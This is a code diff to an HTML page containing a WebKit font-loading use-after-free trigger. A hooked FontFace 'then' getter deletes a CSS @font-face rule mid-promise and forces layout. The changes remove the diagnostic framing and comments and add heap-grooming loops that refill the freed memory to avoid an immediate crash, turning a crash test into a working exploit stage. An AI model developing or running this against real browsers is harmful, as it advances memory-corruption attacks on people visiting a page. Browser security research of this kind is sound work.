@@ -2,65 +2,64 @@
 <html>
 <head>
 <style id="s">
-/* إنشاء القاعدة الأساسية المراد حذفها لاحقاً لتوليد اختلال في شجرة الأنماط */
 @font-face { font-family: targetFont; src: url(nonexistent-font.woff); unicode-range: U+0042; }
 </style>
 </head>
 <body>
     <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
-        [INFO] WebKit UAF Diagnostic Environment Initializing...
+        [INFO] WebKit UAF - Heap Grooming Environment...
     </div>
 
 <script>
-// وظيفة برمجية لطباعة الحالات على الشاشة لتوثيق مراحل الاختبار
 function updateStatus(message) {
     const panel = document.getElementById('status_panel');
-    if (panel) {
-        panel.innerHTML += "<br>[*] " + message;
-    }
+    if (panel) panel.innerHTML += "<br>[*] " + message;
 }
 
-window.onload = () => {
-    updateStatus("DOM Loaded. Preparing FontFace objects...");
+// مصفوفة عالمية للاحتفاظ بالكائنات في الذاكرة ومنع نظام الـ Garbage Collection من حذفها تلقائياً
+let memoryGroomer = [];
 
-    // إنشاء كائن الخط المستهدف (A) وتمريره إلى نظام الخطوط بالمتصفح
+window.onload = () => {
+    updateStatus("Preparing stable memory structures...");
+
+    // 1. مرحلة ما قبل التحرير (Pre-allocation): ملء مساحات الذاكرة القريبة لجعل الـ Heap مستقراً
+    for (let i = 0; i < 100; i++) {
+        memoryGroomer.push(new FontFace('shapingFont' + i, 'local(Arial)', { unicodeRange: 'U+0041' }));
+    }
+
     let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
 
     let fired = false;
 
-    // تزييف خاصية 'then' لاعتراض التنفيذ الداخلي للمحرك (JSC Engine Hook)
     Object.defineProperty(FontFace.prototype, 'then', {
         configurable: true,
         get() {
-            // التحقق من أن عملية الاعتراض تحدث على الكائن المستهدف فقط
             if (!fired && this === A) {
                 fired = true;
-                updateStatus("Hook triggered! Intercepting internal Promise resolution...");
+                updateStatus("Hook triggered. Performing precise memory re-allocation...");
 
-                // محاولة إشغال مخصص الذاكرة (Allocator) بكائنات جديدة أثناء التحرير
-                new FontFace('helper1', 'local(Arial)', { unicodeRange: 'U+0041' });
-                new FontFace('helper2', 'local(Arial Bold)', { unicodeRange: 'U+0041' });
-
-                updateStatus("Executing sheet.deleteRule(0) to free underlying C++ structure...");
-                // حذف القاعدة: هنا يتم تحرير الذاكرة في المتصفحات المصابة
+                // 2. مرحلة الحذف والتحرير
                 document.getElementById('s').sheet.deleteRule(0);
 
-                updateStatus("Forcing synchronous layout reflow via offsetTop...");
-                // إجبار المتصفح على معالجة الذاكرة فوراً
+                // 3. مرحلة ملء الفراغ الفوري (Grooming): محاولة جعل مخصص الذاكرة يضع كائنات جديدة في نفس المساحة المحررة
+                // هذا يمنع الكرش الفوري الناجم عن محاولة قراءة مساحة فارغة تماماً
+                for (let j = 0; j < 50; j++) {
+                    memoryGroomer.push(new FontFace('fillerFont' + j, 'local(Courier)', { unicodeRange: 'U+0041' }));
+                }
+
+                updateStatus("Forcing layout calculation on groomed heap...");
                 document.body.offsetTop; 
             }
             return undefined;
         }
     });
 
-    updateStatus("Invoking document.fonts.load to trigger the vulnerability path...");
-    // استدعاء الدالة التي ستجبر المحرك على البحث عن .then
     document.fonts.load('1em targetFont', 'AB');
 
     setTimeout(() => {
-        updateStatus("Diagnostic sequence finished. Check if browser survived or crashed.");
+        updateStatus("Sequence complete. Observation phase active.");
     }, 500);
 };
 </script>
